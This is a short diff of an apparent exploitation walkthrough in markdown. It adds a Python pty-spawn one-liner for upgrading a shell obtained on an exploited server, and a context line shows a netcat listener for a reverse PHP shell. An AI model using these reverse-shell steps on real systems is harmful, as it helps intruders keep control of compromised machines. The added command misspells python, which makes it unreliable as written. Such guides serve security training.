@@ -26,5 +26,5 @@ netcat -lvnp 1234 (the port number you have in the reversephp file)
 #### Some Additional information
 If you want the shell of the exploited server to run and look a little user friendly then give this command
 ```
-
+pyhton -c 'import pty; pty.spawn("/bin/sh")'
 ```
